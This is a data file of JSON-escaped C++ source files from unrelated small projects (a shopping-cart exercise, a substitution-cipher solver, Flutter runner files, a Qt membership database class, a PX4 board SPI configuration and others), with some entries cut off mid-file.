    "#include <iostream>\n#include <vector>\n#include <algorithm>\n#include <functional>\n#include <iomanip>\n\nclass Article {\npublic:\n    Article(int Id, double price, int qte_stock)\n            : Id(Id), price(price), qte_stock(qte_stock) {}\n\n    int getId() const { return Id; }\n    double getPrice() const { return price; }\n    int getqte_stock() const { return qte_stock; }\n\n    void setqte_stock(int quantity) { qte_stock = quantity; }\n\nprivate:\n    int Id;\n    double price;\n    int qte_stock;\n};\n\nclass Panier {\npublic:\n    void addItem(const Article& article, int quantity) {\n        items.push_back(std::make_pair(article, quantity));\n    }\n\n    void removeItem(int articleId) {\n        items.erase(std::remove_if(items.begin(), items.end(),\n                                   [articleId](const std::pair<Article, int>& item) {\n                                       return item.first.getId() == articleId;\n                                   }), items.end());\n    }\n\n    void modifyQuantity(int articleId, int newQuantity) {\n        for (auto& item : items) {\n            if (item.first.getId() == articleId) {\n                item.second = newQuantity;\n                break;\n            }\n        }\n    }\n\n    void clear() {\n        items.clear();\n    }\n\n    const std::vector<std::pair<Article, int>>& getItems() const {\n        return items;\n    }\n\nprivate:\n    std::vector<std::pair<Article, int>> items;\n};\n\nclass Client {\npublic:\n    Client(const std::string& name, const std::string& email)\n            : name_(name), email_(email) {}\n\n    const std::string& name() const { return name_; }\n    const std::string& email() const { return email_; }\n\nprivate:\n    std::string name_;\n    std::string email_;\n};\n\nclass Commande : public Client {\npublic:\n    Commande(const std::string& name, const std::string& email)\n            : Client(name, email), cart_() {}\n\n    Panier& cart() { return cart_; }\n\nprivate:\n    Panier cart_;\n};\n\n// Function to calculate the total order amount with discounts\ndouble calculateTotal(const Panier& cart) {\n    double total = 0;\n    for (const auto& item : cart.getItems()) {\n        const Article& article = item.first;\n        int quantity = item.second;\n        double price = article.getPrice();\n        // Apply discount if quantity exceeds 10 units\n        if (quantity > 10) {\n            price *= 0.8; // 20% discount\n        }\n        total += price * quantity;\n    }\n    return total;\n}\n\n// Function to display the contents of the shopping cart\nvoid displayCart(const Panier& cart) {\n    std::cout << \"  ID   QTE   PRICE      NAME\\n\";\n    std::cout << \"-------------------------------\\n\";\n    for (const auto& item : cart.getItems()) {\n        const Article& article = item.first;\n        int quantity = item.second;\n        std::cout << std::setw(4) << article.getId() << std::setw(6) << quantity << std::setw(9) << article.getPrice() << \"$\"\n                  << std::setw(10) << \"Article Name\" << \"\\n\";\n    }\n    std::cout << \"-------------------------------\\n\";\n}\n\n// Main function\nint main() {\n    std::string name, email;\n    std::cout << \"Bonjour to Emsi store!\" << std::endl;\n    std::cout << \"Enter your name: \";\n    std::getline(std::cin, name);\n    std::cout << \"Enter your email: \";\n    std::getline(std::cin, email);\n\n    Commande order(name, email);\n\n    char choice;\n    do {\n        std::cout << \"Voici votre panier virtuel:\\n\";\n        displayCart(order.cart());\n        std::cout << \"[A] Ajouter un article\\n\"\n                     \"[B] Supprimer un article\\n\"\n                     \"[C] Modifier quantite\\n\"\n                     \"[D] Afficher tous les articles en ordre croissant\\n\"\n                     \"[E] Montant total du commande avec remises\\n\"\n                     \"[F] Article plus cher du panier\\n\"\n                     \"[G] Articles compris entre prix (min - max)\\n\"\n                     \"[H] Article command\u00e9 (details)\\n\"\n                     \"[I] Vider panier\\n\"\n                     \"Enter your choice: \";\n        std::cin >> choice;\n        std::cin.ignore(); // Ignore the newline character\n        // Perform actions based on choice\n        switch (choice) {\n            case 'A':\n                // Add item to cart\n                // Implement this functionality\n                break;\n            case 'B':\n                // Remove item from cart\n                // Implement this functionality\n                break;\n            case 'C':\n                // Modify quantity of item in cart\n                // Implement this functionality\n                break;\n            case 'D':\n                // Display all items in ascending order by price\n                // Implement this functionality\n                break;\n            case 'E':\n                // Display total order amount with discounts\n                std::cout << \"Total order amount with discounts: $\" << calculateTotal(order.cart()) << std::endl;\n                break;\n            case 'F':\n                // Display the most expensive item in th",
    "#include \"CaesarSub.h\"\r\n\r\n#include <iostream>\r\n#include <fstream>\r\n#include <vector>\r\n#include <cstdlib>\r\n#include <cctype>\r\n#include <cmath>\r\n#include <ctime>\r\n\r\nusing namespace std;\r\n\r\nbool CaesarSubSolve::seededRandGenerator = false;\r\n\r\nstatic string removeNonAlpha(const string& str) {\r\n\tstring ret = \"\";\r\n\tfor (unsigned long i = 0; i < str.length(); i++) {\r\n\t\tif (((str[i] >= 'a') && (str[i] <= 'z')) || ((str[i] >= 'A') && (str[i] <= 'Z'))) {\r\n\t\t\tret += tolower(str[i]);\r\n\t\t}\r\n\t}\r\n\treturn ret;\r\n}\r\n\r\nstatic string swap(const string& str, int i, int j) {\r\n\tstring ret(str);\r\n\tchar c = ret[j];\r\n\tret[j] = ret[i];\r\n\tret[i] = c;\r\n\treturn ret;\r\n}\r\n\r\nCaesarSubSolve::CaesarSubSolve(const string& corpusFile) : i1(0), i2(1) {\r\n\tif (!seededRandGenerator) {\r\n\t\tsrand(time(0));\r\n\t\tseededRandGenerator = true;\r\n\t}\r\n\r\n\tifstream in;\r\n\tin.open(corpusFile);\r\n\r\n\tif (in.fail()) {\r\n\t\tcout << \"Error opening corpus file: \" << corpusFile << endl;\r\n\t\tcout << \"Program will exit.\" << endl;\r\n\t\texit(-1);\r\n\t}\r\n\tcout << \"Processing The Corpus File...\" << endl;\r\n\tstring corpus = \"\", line;\r\n\twhile (in >> line) {\r\n\t\tcorpus += removeNonAlpha(line);\r\n\t}\r\n\tin.close();\r\n\tcout << \"Counting Quadgram Frequencies...\" << endl;\r\n\tstring currQuadgram;\r\n\tsize_t length = corpus.length() - 3;\r\n\tfor (long i = 0; i < length; i++) {\r\n\t\tcurrQuadgram = corpus.substr(i, 4);\r\n\t\tquadgramCounts[currQuadgram] += 1;\r\n\t}\r\n\tfor (auto iter = quadgramCounts.begin(); iter != quadgramCounts.end(); iter++) {\r\n\t\titer->second = log(iter->second / quadgramCounts.size());\r\n\t}\r\n}\r\n\r\nstring CaesarSubSolve::getRandomKey() {\r\n\tif (!seededRandGenerator) {\r\n\t\tsrand(time(0));\r\n\t\tseededRandGenerator = true;\r\n\t}\r\n\tstring key = \"\";\r\n\r\n\tvector<char> alphabet;\r\n\tfor (char c = 'a'; c <= 'z'; c++) {\r\n\t\talphabet.push_back(c);\r\n\t}\r\n\r\n\tint i;\r\n\twhile (!alphabet.empty()) {\r\n\t\ti = rand() % alphabet.size();\r\n\t\tkey += alphabet[i];\r\n\t\talphabet.erase(alphabet.begin() + i);\r\n\t}\r\n\treturn key;\r\n}\r\n\r\n/// <summary>\r\n/// Decocdes the given ciphertext given the key.\r\n/// </summary>\r\nstring CaesarSubSolve::decode(const string& ciphertext, const string& key) {\r\n\tstring decryption = \"\";\r\n\tfor (unsigned int i = 0; i < ciphertext.length(); i++) {\r\n\t\tif (((ciphertext[i] >= 'a') && (ciphertext[i] <= 'z')) || ((ciphertext[i] >= 'A') && (ciphertext[i] <= 'Z'))) {\r\n\t\t\tdecryption += key[tolower(ciphertext[i]) - 'a'];\r\n\t\t}\r\n\t}\r\n\treturn decryption;\r\n}\r\n\r\n/// <summary>\r\n/// Calculates the index of coincidence (IC) given some ciphertext.\r\n/// </summary>\r\ndouble CaesarSubSolve::calculateIC(const string& ciphertext) {\r\n\tstring text = removeNonAlpha(ciphertext);\r\n\tint counts[26];\r\n\tunsigned int i;\r\n\tdouble ic = 0;\r\n\r\n\tfor (i = 0; i < 26; i++) {\r\n\t\tcounts[i] = 0;\r\n\t}\r\n\r\n\tfor (i = 0; i < text.length(); i++) {\r\n\t\tcounts[(text[i] - 'a')]++;\r\n\t}\r\n\r\n\tfor (i = 0; i < 26; i++) {\r\n\t\tic += counts[i] * (counts[i] - 1);\r\n\t}\r\n\r\n\tic /= (text.length() * (text.length() - 1));\r\n\treturn ic;\r\n}\r\n\r\n/// <summary>\r\n/// Returns the fitness of the given text (higher values are better).\r\n/// </summary>\r\ndouble CaesarSubSolve::evaluateFitness(const string& text) const {\r\n\treturn evaluateFitness2(removeNonAlpha(text));\r\n}\r\n\r\ndouble CaesarSubSolve::evaluateFitness2(const string& text) const {\r\n\tdouble fitness = 0;\r\n\t// If the quadgram doesn't appear in the corpus at all, then it's unlikely that the text is English (assuming the corpus is a good sampling of English).\r\n\tdouble noQuadgram = (1.05 * log(1.0 / quadgramCounts.size()));\r\n\r\n\tstring currQuadgram;\r\n\tsize_t length = text.length() - 3;\r\n\tfor (int i = 0; i < length; i++) {\r\n\t\tcurrQuadgram = text.substr(i, 4);\r\n\t\tauto iter = quadgramCounts.find(currQuadgram);\r\n\t\tif (iter == quadgramCounts.end()) {\r\n\t\t\tfitness += noQuadgram;\r\n\t\t}\r\n\t\telse {\r\n\t\t\tfitness += iter->second;\r\n\t\t}\r\n\t}\r\n\treturn fitness;\r\n}\r\n\r\nstring CaesarSubSolve::mutateKey(const string& key) {\r\n\tstring mutatedKey = swap(key, i1, i2);\r\n\r\n\tif (i2 < 25) {\r\n\t\ti2++;\r\n\t}\r\n\telse {\r\n\t\tif (i1 < 24) {\r\n\t\t\ti1++;\r\n\t\t}\r\n\t\telse {//reset\r\n\t\t\ti1 = 0;\r\n\t\t}\r\n\t\ti2 = (i1 + 1);\r\n\t}\r\n\treturn mutatedKey;\r\n}\r\n\r\n/*n = 26 -> sum(i, {i, 1, n - 1}) = ((n - 1)/2)(n) = 325*/\r\n#define MAX_SWAPS 325\r\n\r\n/// <summary>\r\n/// Decrypts the given ciphertext using a hill climbing algorithm.\r\n/// </summary>\r\nstring CaesarSubSolve::decrypt(const string& ciphertext) {\r\n\tstring bestKey = getRandomKey(), currKey;\r\n\tdouble bestFitness = evaluateFitness2(decode(ciphertext, bestKey)), currFitness;\r\n\tint numSwaps = 0;\r\n\r\n\twhile (numSwaps < MAX_SWAPS) {\r\n\t\tcurrKey = mutateKey(bestKey);\r\n\t\tcurrFitness = evaluateFitness2(decode(ciphertext, currKey));\r\n\t\tif (currFitness > bestFitness) {\r\n\t\t\tbestKey = currKey;\r\n\t\t\tbestFitness = currFitness;\r\n\t\t\tnumSwaps = 0;\r\n\t\t}\r\n\t\telse {\r\n\t\t\tnumSwaps++;\r\n\t\t}\r\n\t}\r\n\r\n\treturn decode(ciphertext, bestKey);\r\n}\r\n",
    "#include <iostream>\n#include <map>\n\nint main() {\n    std::multimap<int, std::string> myMultimap;\n\n    // Inserindo elementos\n    myMultimap.insert(std::make_pair(1, \"um\"));\n    myMultimap.insert(std::make_pair(2, \"dois\"));\n    myMultimap.insert(std::make_pair(1, \"primeiro\"));\n    myMultimap.insert(std::make_pair(3, \"tr\u00eas\"));\n    myMultimap.insert(std::make_pair(2, \"segundo\"));\n    myMultimap.insert(std::make_pair(2, \"mais dois\"));\n    myMultimap.insert(std::make_pair(2, \"outro\"));\n\n    // Percorrendo e exibindo elementos\n    std::cout << \"Multimap antes da exclus\u00e3o:\\n\";\n    for (const auto& pair : myMultimap) {\n        std::cout << pair.first << \": \" << pair.second << std::endl;\n    }\n\n\n    auto it = myMultimap.find(2);\n    while (it != myMultimap.upper_bound(2)) {\n        if (it->first == 2) {\n            it = myMultimap.erase(it);\n        } else {\n            ++it;\n        }\n    }\n    \n    // Exibindo o multimap ap\u00f3s a exclus\u00e3o\n    std::cout << \"\\nMultimap ap\u00f3s a exclus\u00e3o:\\n\";\n    for (const auto& pair : myMultimap) {\n        std::cout << pair.first << \": \" << pair.second << std::endl;\n    }\n\n    return 0;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"my_new_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n#include <stdio.h>\n#include \"Charmander.h\"\n#include \"Pokemon.h\"\n\n/**\n * @brief Construct a new Charmander:: Charmander object\n * \n*/\nCharmander:: Charmander() : Pokemon() {\n    type.push_back(\"Fire\");\n    skills.push_back(\"Growl\");\n    skills.push_back(\"Scratch\");\n\n    cout << \"Default Constructor (Charmander)\\n\";\n}\n\n/**\n * @brief Construct a new Charmander:: Charmander object\n * \n * @param name\n * @param hp\n * @param att\n * @param def\n * @param t\n*/\nCharmander::Charmander(string name, int hp, int att, int def, vector<string> t, vector<string> s):\n Pokemon(name, hp, att, def, t) {\n    type = t;\n    skills = s;\n    cout << \"Overloaded Constructor (Charmander)\\n\";\n}\n\n /**\n  * @brief says what a charmander says\n  * \n */\nvoid Charmander::speak(){\n    cout << \"Charmander-char\\n\";\n}\n\n/**\n * @brief call printStats from the parent class (Pokemon) and appends the skills used for Charmander\n * \n*/\nvoid Charmander::printStats(){\n    Pokemon::printStats();\n    cout << \"Skills: \";\n    for(int i = 0; i < skills.size(); i++){\n        cout << skills[i] << \"\\t\";\n    }\n    cout << endl;\n}",
    "/*\n * Copyright (C) 2019 The LineageOS Project\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *      http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\n#define LOG_TAG \"vendor.lineage.livedisplay@2.1-service-spaced\"\n\n#include <android-base/logging.h>\n#include <binder/ProcessState.h>\n#include <hidl/HidlTransportSupport.h>\n\n#include \"AntiFlicker.h\"\n#include \"SunlightEnhancement.h\"\n\nusing android::hardware::configureRpcThreadpool;\nusing android::hardware::joinRpcThreadpool;\n\nusing ::vendor::lineage::livedisplay::V2_1::IAntiFlicker;\nusing ::vendor::lineage::livedisplay::V2_1::ISunlightEnhancement;\nusing ::vendor::lineage::livedisplay::V2_1::implementation::AntiFlicker;\nusing ::vendor::lineage::livedisplay::V2_1::implementation::SunlightEnhancement;\n\nint main() {\n    android::sp<IAntiFlicker> af = new AntiFlicker();\n    android::sp<SunlightEnhancement> se = new SunlightEnhancement();\n\n    configureRpcThreadpool(1, true /*callerWillJoin*/);\n\n    if (af->registerAsService() != android::OK) {\n        LOG(ERROR) << \"Cannot register anti flicker HAL service.\";\n        return 1;\n    }\n\n    if (se->registerAsService() != android::OK) {\n        LOG(ERROR) << \"Cannot register sunlight enhancement HAL service.\";\n        return 1;\n    }\n\n    LOG(INFO) << \"LiveDisplay HAL service is ready.\";\n\n    joinRpcThreadpool();\n\n    LOG(ERROR) << \"LiveDisplay HAL service failed to join thread pool.\";\n    return 1;\n}\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include <sstream>\n#include \"fight.h\"\n#include \"Cave.h\"\n#include \"Tool.h\"\n#include \"enemy.h\"\n\n\nCave::Cave() {}\n\nCave::Cave(int id, std::string name, int gold, bool cleared = false) : _id(id), _name(name), _gold(gold), _cleared(cleared) {}\n\n\n\nint Cave::getid() const{\n    return _id;\n}\n\nint Cave::getGold() const{\n    return _gold;\n}\n\nstd::string Cave::getName() const{\n    return _name;\n}\n\n\n\nvoid Cave::addEnemy(Enemy &Enemy){\n    Cave_Enemy.push_back(Enemy);\n}\n\n\n\nvoid printCaves(){\n    system(\"clear\");\n    std::vector<Cave> Caves = setupCaves();\n\n    for(const Cave &Cave : Caves){\n        std::cout << \"Id: \" << Cave.getid() << \", Name: \" << Cave.getName() << \", Gold: \" << Cave.getGold() << std::endl;\n    }\n\n    std::cout << std::endl << std::endl;\n}\n\n\nstd::vector<Cave> setupCaves(){\n\n    std::vector<Enemy> enemy = setupEnemies();\n    std::vector<Cave> caves; \n\n    Cave C1(1, \" Slime grotto \", 100);\n    for(int i = 0; i < 5; i++){\n        C1.addEnemy(enemy[0]);\n    }\n    caves.push_back(C1);\n\n    Cave C2(2, \" The forgotten cave \", 200 );\n    for(int i = 0; i < 5; i++){\n        C2.addEnemy(enemy[1]);\n    }\n    caves.push_back(C2);\n\n    Cave C3(3, \" Unicorn cave \", 1000);\n    for(int i = 0; i < 5; i++){\n        C3.addEnemy(enemy[6]);\n    }\n    caves.push_back(C3);\n\n    return caves; \n}\n\n\nconst std::vector<Enemy> & Cave::getEnemies() const{\n    return Cave_Enemy;\n}\n\n\n\nbool Cave::isCleared(){\n    return _cleared;\n}\n\nvoid Cave::markCleared(){\n    _cleared = true;\n}\n\n\nvoid cave_select(){\n\n    char cho;\n    int choice; \n    std::cout << \"Enter the id of the cave you want to clear or 0 to exit: \";\n    cho = Too.getKeypress();\n    choice = cho - '0';\n    std::cout << std::endl;\n\n    std::vector<Cave> caves = setupCaves();\n    if(choice > 0 && choice <= caves.size()){\n        Cave& selectedCave = caves[choice - 1];\n        if(selectedCave.isCleared() == true){\n            std::cout << \"This cave has not been reset\" << std::endl;\n        } else {\n            std::ostringstream message;\n            message << \"Entering \" << selectedCave.getName() << std::endl << std::endl;\n            Too.slow_print(message.str());\n            selectedCave.printCaveEnemies();\n            \n            F1.Cavefight(god, selectedCave);\n\n            message << \"\";\n            message.clear();\n            message << \"You have cleared \" << selectedCave.getName() << \" and earned \" << selectedCave.getGold() << \" gold!\" << std::endl;\n            Too.slow_print(message.str());\n            selectedCave.markCleared();  \n            god.addGold(selectedCave.getGold());           \n        }\n    } else if(choice == 0){\n    } else {\n         std::cout << \"Invalid choice, try again\" << std::endl;\n         cave_select();\n    }\n    \n\n}\n\nvoid Cave::printCaveEnemies() const {\n    if (Cave_Enemy.empty()) {\n        std::cout << \"This cave is currently free of enemies.\" << std::endl;\n    } else {\n        std::cout << \"List of Enemies in \" << _name << \":\" << std::endl;\n        for (const Enemy& enemy : Cave_Enemy) {\n            std::cout << \"- \" << enemy.getName() << \" (HP: \" << enemy.getHealth() << \")\" << std::endl;\n        }\n    }\n}\n\n\nvoid print();",
    "#include \"membership.h\"\n#include <QString>\n#include <QSqlQuery>\n#include <QSqlQueryModel>\n#include <QMessageBox>\n#include <QModelIndexList>\n#include <QFile>\n#include <QTextStream>\n#include <QDateTime>\n\nMembership::Membership(int id, QString type, int price, int duration, QString description)\n{\n    this->id = id;\n    this->type = type;\n    this->description = description;\n    this->price = price;\n    this->duration = duration;\n}\n\nbool Membership::Create()\n{\n    QSqlQuery query;\n\n    QString res = QString::number(id);\n\n    query.prepare(\"insert into MEMBERSHIPS (MEMBERSHIPID, MEMBERSHIPNAME, MEMBERSHIPDESCRIPTION, MEMBERSHIPFEE, MEMBERSHIPDURATION)\"\n                  \"values(:id, :type, :description, :price, :duration)\");\n\n    query.bindValue(\":id\", res);\n    query.bindValue(\":type\", type);\n    query.bindValue(\":price\", price);\n    query.bindValue(\":duration\", duration);\n    query.bindValue(\":description\", description);\n\n    if (!query.exec())\n    {\n        logAction(\"Failed to delete membership: Membership ID \" + QString::number(id));\n        return false;\n    }\n    else\n    {\n        logAction(\"Deleted membership successfully: Membership ID \" + QString::number(id));\n        return true;\n    }\n}\n\nbool Membership::UpdateMembership()\n{\n    QSqlQuery query;\n\n    query.prepare(\"SELECT COUNT(*) FROM MEMBERSHIPS WHERE MEMBERSHIPID = :id\");\n    query.bindValue(\":id\", QString::number(id));\n\n    if(!query.exec()) {\n        return false;\n    }\n    if(query.next() && query.value(0).toInt() == 0) {\n        return false;\n    }\n\n    query.prepare(\"UPDATE MEMBERSHIPS SET MEMBERSHIPNAME = :type, MEMBERSHIPDESCRIPTION = :description, MEMBERSHIPFEE = :price, MEMBERSHIPDURATION = :duration WHERE MEMBERSHIPID = :id\");\n\n    query.bindValue(\":id\", QString::number(id));\n    query.bindValue(\":type\", type);\n    query.bindValue(\":description\", description);\n    query.bindValue(\":price\", price);\n    query.bindValue(\":duration\", duration);\n\n    bool success = query.exec();\n    if(success) {\n            logAction(\"Updated membership successfully: Membership ID \" + QString::number(id));\n        } else {\n            logAction(\"Failed to update membership: Membership ID \" + QString::number(id));\n        }\n\n    return success;\n}\n\nQSqlQueryModel *Membership::Read()\n{\n    QSqlQueryModel * model = new QSqlQueryModel();\n\n    model->setQuery(\"select * from MEMBERSHIPS\");\n    model->setHeaderData(0, Qt::Horizontal, QObject::tr(\"ID\"));\n    model->setHeaderData(1, Qt::Horizontal, QObject::tr(\"Type\"));\n    model->setHeaderData(2, Qt::Horizontal, QObject::tr(\"Price\"));\n    model->setHeaderData(3, Qt::Horizontal, QObject::tr(\"Duration\"));\n    model->setHeaderData(4, Qt::Horizontal, QObject::tr(\"Description\"));\n\n    return model;\n}\n\nbool Membership::Delete(int id)\n{\n    QMessageBox::StandardButton confirmDelete = QMessageBox::question(nullptr, \"Confirm Deletion\",\n            \"Are you sure you want to delete the selected member?\", QMessageBox::Yes|QMessageBox::No);\n\n    if (confirmDelete == QMessageBox::Yes)\n    {\n        QSqlQuery query;\n        query.prepare(\"DELETE FROM MEMBERSHIPS WHERE MEMBERSHIPID = :id\");\n        query.bindValue(\":id\", id);\n\n        if (!query.exec())\n        {\n            logAction(\"Failed to delete membership: Membership ID \" + QString::number(id));\n            return false;\n        }\n        else\n        {\n            logAction(\"Deleted membership successfully: Membership ID \" + QString::number(id));\n            return true;\n        }\n    }\n    else\n    {\n        logAction(\"Deletion cancelled by user: Membership ID \" + QString::number(id));\n        return false;\n    }\n}\n\nQSqlQueryModel* Membership::searchByDescription(const QString &searchTerm)\n{\n    QSqlQueryModel *model = new QSqlQueryModel();\n\n    QSqlQuery query;\n    query.prepare(\"SELECT * FROM MEMBERSHIPS WHERE LOWER(MEMBERSHIPDESCRIPTION) LIKE LOWER(:searchTerm)\");\n    query.bindValue(\":searchTerm\", '%' + searchTerm + '%');\n\n    if(query.exec())\n    {\n        model->setQuery(query);\n    }\n\n    model->setHeaderData(0, Qt::Horizontal, QObject::tr(\"ID\"));\n    model->setHeaderData(1, Qt::Horizontal, QObject::tr(\"Type\"));\n    model->setHeaderData(2, Qt::Horizontal, QObject::tr(\"Price\"));\n    model->setHeaderData(3, Qt::Horizontal, QObject::tr(\"Duration\"));\n    model->setHeaderData(4, Qt::Horizontal, QObject::tr(\"Description\"));\n\n    return model;\n}\n\nvoid Membership::logAction(const QString &action) {\n    QFile file(\"log.txt\");\n    if (file.open(QIODevice::Append | QIODevice::Text)) {\n        QTextStream out(&file);\n        out << QDateTime::currentDateTime().toString(\"yyyy-MM-dd HH:mm:ss\") << \": \" << action << \"\\n\";\n        file.close();\n    }\n}\n",
    "#include <iostream>\n#include <string>\n#include <unordered_map>\n#include <vector>\n#include \"LZW.cpp\"\n#include \"archivos.cpp\"\n\n\nstring leer_entrada() {\n    string entrada; \n    string texto_completo; \n\n    cout << \"Ingresa texto. Presiona Enter despu\u00e9s de cada l\u00ednea.\" << std::endl;\n    \n    while (std::getline(std::cin, entrada)) {\n        if (entrada == \"exit\") { \n            break;\n        }\n        texto_completo += entrada + \"\\n\"; \n    }\n    \n    return texto_completo;\n}\n\n\nint main(int argc, char *argv[]) {\n\n    if (argc != 3) {\n        cerr << \"Uso: \" << argv[0] << \" <nombre de archivo sin extension> \" << \"<opcion>\";\n    }   \n\n    string nombre_archivo = argv[1];\n    string opcion = argv[2];\n\n\n\tif (opcion == \"crear\") {\n        string entrada = leer_entrada();\n\n        escribir_archivo_plano(entrada, nombre_archivo);\n\n        vector<int> comprimido = comprimir_lzw(entrada); \n\n        escribir_archivo_comprimido(comprimido, nombre_archivo);\n\n        cout << \"Archivo comprimido y escrito exitosamente.\" << endl;\n\n    }\n\n    if (opcion == \"editar\") {\n        cout << \"Contenido del archivo comprimido: \" << endl;\n\n        vector<int> contenido = leer_archivo_comprimido(nombre_archivo);\n        string descomprimido = descomprimir_lzw(contenido);\n        cout << descomprimido;\n\n        string entrada = leer_entrada();\n\n        entrada = descomprimido + entrada;\n\n        vector<int> comprimido = comprimir_lzw(entrada); \n\n        escribir_archivo_comprimido(comprimido, nombre_archivo);\n        escribir_archivo_plano(entrada, nombre_archivo);\n\n        cout << \"Archivo editado exitosamente\" << endl;\n    }\n\n    return 0;\n}\n\n\n",
    "/****************************************************************************\n *\n *   Copyright (C) 2024 PX4 Development Team. All rights reserved.\n *\n * Redistribution and use in source and binary forms, with or without\n * modification, are permitted provided that the following conditions\n * are met:\n *\n * 1. Redistributions of source code must retain the above copyright\n *    notice, this list of conditions and the following disclaimer.\n * 2. Redistributions in binary form must reproduce the above copyright\n *    notice, this list of conditions and the following disclaimer in\n *    the documentation and/or other materials provided with the\n *    distribution.\n * 3. Neither the name PX4 nor the names of its contributors may be\n *    used to endorse or promote products derived from this software\n *    without specific prior written permission.\n *\n * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS\n * \"AS IS\" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT\n * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS\n * FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE\n * COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,\n * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,\n * BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS\n * OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED\n * AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT\n * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN\n * ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE\n * POSSIBILITY OF SUCH DAMAGE.\n *\n ****************************************************************************/\n\n#include <px4_arch/spi_hw_description.h>\n#include <drivers/drv_sensor.h>\n#include <nuttx/spi/spi.h>\n\nconstexpr px4_spi_bus_all_hw_t px4_spi_buses_all_hw[BOARD_NUM_SPI_CFG_HW_VERSIONS] = {\n\tinitSPIFmumID(ARKPI6X_0, {\n\t\tinitSPIBus(SPI::Bus::SPI1, {\n\t\t\tinitSPIDevice(DRV_IMU_DEVTYPE_ICM42688P, SPI::CS{GPIO::PortI, GPIO::Pin9}, SPI::DRDY{GPIO::PortF, GPIO::Pin2}),\n\t\t}, {GPIO::PortI, GPIO::Pin11}),\n\t\tinitSPIBus(SPI::Bus::SPI2, {\n\t\t\tinitSPIDevice(DRV_IMU_DEVTYPE_ICM42688P, SPI::CS{GPIO::PortH, GPIO::Pin5}, SPI::DRDY{GPIO::PortA, GPIO::Pin10}),\n\t\t}),\n\t\tinitSPIBus(SPI::Bus::SPI3, {\n\t\t\tinitSPIDevice(DRV_FLOW_DEVTYPE_PAW3902, SPI::CS{GPIO::PortI, GPIO::Pin4}, SPI::DRDY{GPIO::PortI, GPIO::Pin6}),\n\t\t}),\n\t\t//  initSPIBus(SPI::Bus::SPI4, {\n\t\t//    // no devices\n\t\t// TODO: if enabled, remove GPIO_VDD_3V3_SENSORS4_EN from board_config.h\n\t\t//  }, 